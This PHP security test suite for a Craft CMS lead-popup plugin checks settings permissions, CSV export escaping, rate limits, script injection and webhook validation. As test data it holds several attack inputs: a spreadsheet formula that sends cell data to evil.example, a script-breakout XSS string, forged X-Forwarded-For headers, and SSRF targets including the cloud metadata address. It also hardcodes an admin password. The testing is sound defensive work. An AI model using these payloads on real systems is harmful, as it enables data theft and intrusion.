<?php
/**
 * Who can change settings, what an export hands a spreadsheet, the public endpoints' budgets,
 * what the injected script carries, and where an integration may send a lead — checked in the
 * plugin-testing harness, mostly over HTTP.
 *
 *     docker exec -w /var/www/html ddev-plugin-testing-web php /var/www/craft-leads/tests/integration/security.php
 *
 * Until 5.0.6 "Manage settings" could change project-config settings anywhere; the CSV export
 * passed `=HYPERLINK(…)` names through to Excel; the submit limiter keyed on a forgeable
 * X-Forwarded-For and the tracking endpoint counted anything; a `</script>` in custom CSS closed
 * the injected config; "Save $10" lost its "$10"; and a webhook could point at any address.
 *
 * The read-only check needs a web request with admin changes off, so it flips
 * CRAFT_ALLOW_ADMIN_CHANGES in the harness .env for a few seconds and always puts it back.
 * Self-cleaning.
 */

$root = getcwd();
require $root . '/bootstrap.php';

/** @var craft\console\Application $app */
$app = require CRAFT_VENDOR_PATH . '/craftcms/cms/bootstrap/console.php';

use craft\db\Query;
use craft\elements\User;
use GuzzleHttp\Client;
use GuzzleHttp\Cookie\CookieJar;
use justinholtweb\leads\elements\Popup;
use justinholtweb\leads\Plugin;

$passed = 0;
$failed = 0;

function check(string $label, callable $test): void
{
    global $passed, $failed;

    try {
        $result = $test();
    } catch (Throwable $e) {
        $result = get_class($e) . ': ' . $e->getMessage();
    }

    if ($result === true) {
        $passed++;
        echo "  ✓ $label\n";
    } else {
        $failed++;
        echo "  ✗ $label\n    " . (is_string($result) ? $result : var_export($result, true)) . "\n";
    }
}

Craft::$app->getPlugins()->loadPlugins();
$leads = Plugin::getInstance();
$run = substr(bin2hex(random_bytes(3)), 0, 6);
$password = 'Leads-' . bin2hex(random_bytes(6));
$envFile = $root . '/.env';
$envBefore = (string)file_get_contents($envFile);
$templates = $root . '/templates';
$settingsBefore = Craft::$app->getProjectConfig()->get('plugins.leads.settings');
$cleanup = ['popups' => [], 'users' => [], 'templates' => []];

$restoreEnv = static function() use ($envFile, $envBefore) {
    if ((string)file_get_contents($envFile) !== $envBefore) {
        file_put_contents($envFile, $envBefore);
    }
};

$reloadConfig = static function() {
    Craft::$app->getInfo()->configVersion = (string)(new Query())->select('configVersion')->from('{{%info}}')->scalar();
    Craft::$app->getProjectConfig()->reset();
};

register_shutdown_function(function() use (&$cleanup, $restoreEnv, $reloadConfig, $settingsBefore) {
    $restoreEnv();
    foreach ($cleanup['templates'] as $file) {
        @unlink($file);
    }
    foreach ($cleanup['popups'] as $id) {
        Craft::$app->getDb()->createCommand()->delete('{{%leads_submissions}}', ['popupId' => $id])->execute();
        Craft::$app->getDb()->createCommand()->delete('{{%leads_stats}}', ['popupId' => $id])->execute();
        if ($popup = Popup::find()->id($id)->status(null)->one()) {
            Craft::$app->getElements()->deleteElement($popup, true);
        }
    }
    foreach ($cleanup['users'] as $user) {
        Craft::$app->getElements()->deleteElement($user, true);
    }

    $reloadConfig();
    $pc = Craft::$app->getProjectConfig();
    if ($pc->get('plugins.leads.settings') !== $settingsBefore) {
        $pc->set('plugins.leads.settings', $settingsBefore, 'Restore after security.php');
        $pc->saveModifiedConfigData();
        $pc->writeYamlFiles(true);
    }
});

$withAdminChangesOff = static function(callable $fn) use ($envFile, $envBefore, $restoreEnv) {
    $off = preg_match('/^CRAFT_ALLOW_ADMIN_CHANGES=.*$/m', $envBefore)
        ? preg_replace('/^CRAFT_ALLOW_ADMIN_CHANGES=.*$/m', 'CRAFT_ALLOW_ADMIN_CHANGES=false', $envBefore)
        : rtrim($envBefore) . "\nCRAFT_ALLOW_ADMIN_CHANGES=false\n";
    file_put_contents($envFile, $off);
    try {
        return $fn();
    } finally {
        $restoreEnv();
    }
};

function client(string $username, string $password): array
{
    $http = new Client(['base_uri' => 'http://localhost/', 'cookies' => new CookieJar(), 'http_errors' => false, 'allow_redirects' => false]);
    $json = ['Accept' => 'application/json'];
    $csrf = static fn() => (string)(json_decode((string)$http->get('index.php?p=actions/users/session-info', ['headers' => $json])->getBody(), true)['csrfTokenValue'] ?? '');
    $login = $http->post('index.php?p=actions/users/login', ['headers' => $json, 'form_params' => ['loginName' => $username, 'password' => $password, 'CRAFT_CSRF_TOKEN' => $csrf()]]);

    if ($login->getStatusCode() !== 200) {
        echo "Could not sign in as $username\n";
        exit(1);
    }

    $post = static fn(string $action, array $params) => $http->post("index.php?p=admin/actions/$action", [
        'headers' => $json,
        'form_params' => $params + ['CRAFT_CSRF_TOKEN' => $csrf()],
    ]);

    return [$http, $post];
}

// A live popup that only shows on this run's pages.
$popup = new Popup([
    'title' => "Leads security $run",
    'popupType' => 'modal',
    'heading' => 'Join us',
    'buttonText' => 'Save $10 today',
    'customCss' => '.x{} </script><script>window.leadsPwned=1</script>',
    'targetingRules' => ['pages' => ["*leads-security-$run*"]],
    'popupStatus' => 'active',
]);
Craft::$app->getElements()->saveElement($popup) or throw new RuntimeException(json_encode($popup->getErrors()));
$cleanup['popups'][] = $popup->id;

$draft = new Popup(['title' => "Leads security draft $run", 'popupStatus' => 'draft', 'targetingRules' => ['pages' => ["*leads-security-$run*"]]]);
Craft::$app->getElements()->saveElement($draft) or throw new RuntimeException(json_encode($draft->getErrors()));
$cleanup['popups'][] = $draft->id;

// A non-admin who has every Leads permission, settings included.
$manager = new User(['username' => "leads-manager-$run", 'email' => "leads-manager-$run@example.com", 'newPassword' => $password]);
Craft::$app->getElements()->saveElement($manager, false);
Craft::$app->getUsers()->activateUser($manager);
Craft::$app->getUserPermissions()->saveUserPermissions($manager->id, [
    'accesscp', 'accessplugin-leads', 'leads:accessplugin', 'leads:managepopups', 'leads:viewsubmissions',
    'leads:exportsubmissions', 'leads:viewdashboard', 'leads:managesettings',
]);
$cleanup['users'][] = $manager;

[$managerHttp, $managerPost] = client($manager->username, $password);
[$adminHttp, $adminPost] = client('admin', 'claudepassword');

echo "\nSettings\n";

$storedRate = static function() use ($reloadConfig) {
    $reloadConfig();

    return Craft::$app->getProjectConfig()->get('plugins.leads.settings.rateLimitPerMinute');
};

check('“Manage settings” alone can’t change them', function() use ($managerPost, $storedRate) {
    $before = $storedRate();
    $status = $managerPost('leads/settings/save', ['settings' => ['rateLimitPerMinute' => 599]])->getStatusCode();

    return $status === 403 && $storedRate() === $before ?: "status $status, stored " . var_export($storedRate(), true);
});

check('…and its screen is read-only', function() use ($managerHttp) {
    $body = (string)$managerHttp->get('index.php?p=admin/leads/settings')->getBody();

    return str_contains($body, 'leads-readonly') ?: 'no read-only form';
});

check('an admin can, a partial post keeps the rest, and config-only settings can’t be posted', function() use ($adminPost, $storedRate) {
    $status = $adminPost('leads/settings/save', ['settings' => ['rateLimitPerMinute' => 7, 'allowPrivateWebhookHosts' => '1']])->getStatusCode();
    $rate = $storedRate();
    $inject = Craft::$app->getProjectConfig()->get('plugins.leads.settings.autoInjectScript');
    $private = Craft::$app->getProjectConfig()->get('plugins.leads.settings.allowPrivateWebhookHosts');

    return (int)$rate === 7 && $inject && !$private
        ?: "status $status, rate " . var_export($rate, true) . ', inject ' . var_export($inject, true) . ', private hosts ' . var_export($private, true);
});

check('with admin changes off, not even an admin can, and the screen says so', fn() => $withAdminChangesOff(function() use ($adminPost, $adminHttp, $storedRate) {
    $status = $adminPost('leads/settings/save', ['settings' => ['rateLimitPerMinute' => 8]])->getStatusCode();
    $body = (string)$adminHttp->get('index.php?p=admin/leads/settings')->getBody();

    return $status === 403 && (int)$storedRate() === 7 && str_contains($body, 'leads-readonly') ?: "status $status, rate " . var_export($storedRate(), true);
}));

// Back to what it was, so the submit limit below is the harness's.
$reloadConfig();
Craft::$app->getProjectConfig()->set('plugins.leads.settings', $settingsBefore, 'Restore after settings checks');
Craft::$app->getProjectConfig()->saveModifiedConfigData();
Craft::$app->getProjectConfig()->writeYamlFiles(true);

echo "\nThe CSV export\n";

$db = Craft::$app->getDb();
$now = (new DateTime())->format('Y-m-d H:i:s');
$db->createCommand()->insert('{{%leads_submissions}}', [
    'popupId' => $popup->id, 'email' => "csv-$run@example.com", 'name' => '=HYPERLINK("http://evil.example/?"&A1,"Click")',
    'pageUrl' => '@SUM(1+1)', 'syncStatus' => 'pending', 'dateCreated' => $now, 'dateUpdated' => $now, 'uid' => \craft\helpers\StringHelper::UUID(),
])->execute();

check('formula cells come out as text', function() use ($managerHttp, $popup) {
    $csv = (string)$managerHttp->get("index.php?p=admin/actions/leads/submissions/export&popupId={$popup->id}")->getBody();
    $rows = array_map(static fn($line) => str_getcsv($line, ',', '"', ''), array_filter(explode("\n", trim($csv))));
    $row = $rows[1] ?? [];

    return ($row[1] ?? null) === '\'=HYPERLINK("http://evil.example/?"&A1,"Click")' && ($row[2] ?? null) === "'@SUM(1+1)"
        ?: 'row ' . json_encode($row);
});

echo "\nThe public endpoints\n";

// The budgets are per minute; start early in one so a rollover can't split a check.
if ((int)date('s') > 40) {
    sleep(61 - (int)date('s'));
}

$anon = new Client(['base_uri' => 'http://localhost/', 'http_errors' => false, 'allow_redirects' => false]);
$minute = intdiv(time(), 60);
foreach (['submit', 'track'] as $bucket) {
    Craft::$app->getCache()->delete(sprintf('leads:rate:%s:%s:%d', $bucket, sha1('127.0.0.1'), $minute));
    Craft::$app->getCache()->delete(sprintf('leads:rate:%s:*:%d', $bucket, $minute));
}

$impressions = static fn(int $id) => (int)(new Query())->from('{{%leads_stats}}')->where(['popupId' => $id])->sum('impressions');
$track = static fn(int $id, array $headers = []) => $anon->post('index.php?p=actions/leads/tracking/track', [
    'headers' => ['Accept' => 'application/json'] + $headers,
    'form_params' => ['popupId' => $id, 'type' => 'impression'],
]);

check('an impression for a draft popup isn’t counted', function() use ($track, $draft, $impressions) {
    $response = $track($draft->id);

    return $impressions($draft->id) === 0 && !(json_decode((string)$response->getBody(), true)['success'] ?? true) ?: 'counted';
});

check('nor one for a popup that doesn’t exist', function() use ($track) {
    return !(json_decode((string)$track(999999999)->getBody(), true)['success'] ?? true) ?: 'accepted';
});

check('a live popup’s impressions count, up to the per-minute budget, then 429', function() use ($track, $popup, $impressions, $leads) {
    $budget = $leads->getSettings()->trackingPerMinute;
    $statuses = [];
    for ($i = 0; $i < $budget + 2; $i++) {
        $statuses[] = $track($popup->id)->getStatusCode();
    }
    $refusedAt = array_search(429, $statuses, true);

    // The two refusals above (draft, missing) were spent from the same budget.
    return $refusedAt !== false && $refusedAt > 0 && $refusedAt <= $budget && $impressions($popup->id) === $refusedAt
        ?: "first 429 at " . var_export($refusedAt, true) . ", counted " . $impressions($popup->id);
});

check('…and a forged X-Forwarded-For doesn’t buy a fresh one', function() use ($track, $popup) {
    $status = $track($popup->id, ['X-Forwarded-For' => '203.0.113.' . random_int(1, 254)])->getStatusCode();

    return $status === 429 ?: "status $status";
});

check('the submit limiter isn’t reset by X-Forwarded-For either', function() use ($anon, $popup, $leads, $run) {
    $budget = $leads->getSettings()->rateLimitPerMinute;
    $statuses = [];
    for ($i = 0; $i < $budget + 1; $i++) {
        $statuses[] = $anon->post('index.php?p=actions/leads/submit', [
            'headers' => ['Accept' => 'application/json', 'X-Forwarded-For' => "198.51.100.$i"],
            'form_params' => ['popupId' => $popup->id, 'email' => "submit-$i-$run@example.com"],
        ])->getStatusCode();
    }

    return ($statuses[$budget] ?? null) === 429 && count(array_filter($statuses, static fn($s) => $s === 200)) === $budget
        ?: json_encode(array_count_values($statuses));
});

echo "\nThe injected script\n";

$page = "leads-security-$run";
file_put_contents("$templates/$page.twig", "<!doctype html><html><body><p>Page</p></body></html>");
file_put_contents("$templates/$page-sandbox.twig", "{% header \"Content-Security-Policy: sandbox allow-scripts\" %}<!doctype html><html><body><p>Embed</p></body></html>");
file_put_contents("$templates/$page-json.twig", "{% header \"Content-Type: application/json\" %}{\"ok\":true}");
$cleanup['templates'][] = "$templates/$page.twig";
$cleanup['templates'][] = "$templates/$page-sandbox.twig";
$cleanup['templates'][] = "$templates/$page-json.twig";

$body = (string)$anon->get("index.php?p=$page")->getBody();

check('the popup is injected on its page, before </body>', function() use ($body) {
    $at = strpos($body, '_leadsConfig');

    return $at !== false && $at < strripos($body, '</body>') ?: 'not injected';
});

check('“Save $10” survives the splice', fn() => str_contains($body, 'Save $10 today') ?: 'lost: ' . (preg_match('/Save[^"<]{0,20}/', $body, $m) ? $m[0] : '?'));

check('a </script> in custom CSS can’t close the config script', function() use ($body) {
    return !str_contains($body, '<script>window.leadsPwned') && str_contains($body, '</script>') ?: 'raw tag in output';
});

check('a page served with a sandbox CSP gets nothing', function() use ($anon, $page) {
    $body = (string)$anon->get("index.php?p=$page-sandbox")->getBody();

    return str_contains($body, 'Embed') && !str_contains($body, '_leadsConfig') ?: 'injected';
});

check('nor does a template serving JSON', function() use ($anon, $page) {
    $body = (string)$anon->get("index.php?p=$page-json")->getBody();

    return $body === '{"ok":true}' ?: 'body: ' . substr($body, 0, 80);
});

echo "\nWhere an integration may send a lead\n";

$validated = static function(string $provider, array $settings): array {
    $popup = new Popup(['title' => 'x', 'integrationProvider' => $provider, 'integrationSettings' => $settings]);
    $popup->validate(['integrationSettings']);

    return $popup->getErrors('integrationSettings');
};

foreach ([
    'loopback' => 'http://127.0.0.1/hook',
    'the cloud metadata service' => 'http://169.254.169.254/latest/meta-data/',
    'a private network' => 'https://10.0.0.5/hook',
    'IPv4 dressed as IPv6' => 'http://[::ffff:127.0.0.1]/hook',
    'credentials in the URL' => 'https://user:pass@example.com/hook',
    'another scheme' => 'ftp://example.com/hook',
] as $what => $url) {
    check("a webhook to $what won’t save", fn() => $validated('webhook', ['webhookUrl' => $url]) !== [] ?: 'saved');
}

check('a public webhook will', fn() => $validated('webhook', ['webhookUrl' => 'https://example.com/hook']) === [] ?: json_encode($validated('webhook', ['webhookUrl' => 'https://example.com/hook'])));

check('an unset environment variable is reported, not saved as a blank', function() use ($validated, $run) {
    $errors = $validated('mailchimp', ['apiKey' => '$LEADS_UNSET_' . strtoupper($run), 'listId' => 'abc']);

    return $errors !== [] ?: 'saved';
});

check('a set one resolves to its value when the integration is built', function() use ($leads, $run) {
    $name = 'LEADS_SECURITY_' . strtoupper($run);
    putenv("$name=https://example.com/from-env");
    $_SERVER[$name] = 'https://example.com/from-env';
    $resolved = $leads->integrations->resolve(['webhookUrl' => '$' . $name]);
    putenv($name);
    unset($_SERVER[$name]);

    return ($resolved['webhookUrl'] ?? null) === 'https://example.com/from-env' ?: json_encode($resolved);
});

check('a Mailchimp key whose data centre isn’t one is refused', fn() => $validated('mailchimp', ['apiKey' => 'abc-evil.example/x', 'listId' => 'abc']) !== [] ?: 'saved');

check('the popup editor stores only the chosen provider’s settings', function() use ($adminPost, $popup) {
    $adminPost('leads/popups/save', [
        'popupId' => $popup->id, 'title' => $popup->title, 'popupStatus' => 'draft',
        'integrationProvider' => 'webhook',
        'integrationSettings' => ['webhookUrl' => ' https://example.com/hook ', 'apiKey' => 'leftover', 'listId' => 'leftover'],
    ]);
    $stored = (new Query())->select('integrationSettings')->from('{{%leads_popups}}')->where(['id' => $popup->id])->scalar();
    $stored = is_string($stored) ? json_decode($stored, true) : $stored;

    return $stored === ['webhookUrl' => 'https://example.com/hook'] ?: 'stored ' . json_encode($stored);
});

check('…and refuses a private webhook URL', function() use ($adminPost, $popup) {
    $adminPost('leads/popups/save', [
        'popupId' => $popup->id, 'title' => $popup->title, 'popupStatus' => 'draft',
        'integrationProvider' => 'webhook', 'integrationSettings' => ['webhookUrl' => 'http://169.254.169.254/'],
    ]);
    $stored = (string)(new Query())->select('integrationSettings')->from('{{%leads_popups}}')->where(['id' => $popup->id])->scalar();

    return !str_contains($stored, '169.254') ?: 'stored ' . $stored;
});

echo "\nDuplicating\n";

check('Duplicate answers an Ajax request with the copy’s ID', function() use ($adminPost, $popup, &$cleanup) {
    $response = $adminPost('leads/popups/duplicate', ['popupId' => $popup->id]);
    $id = (int)(json_decode((string)$response->getBody(), true)['id'] ?? 0);
    if ($id) {
        $cleanup['popups'][] = $id;
    }

    return $response->getStatusCode() === 200 && $id && $id !== $popup->id && Popup::find()->id($id)->status(null)->exists()
        ?: 'status ' . $response->getStatusCode() . ' ' . substr((string)$response->getBody(), 0, 200);
});

echo "\n$passed passed, $failed failed\n";
exit($failed === 0 ? 0 : 1);
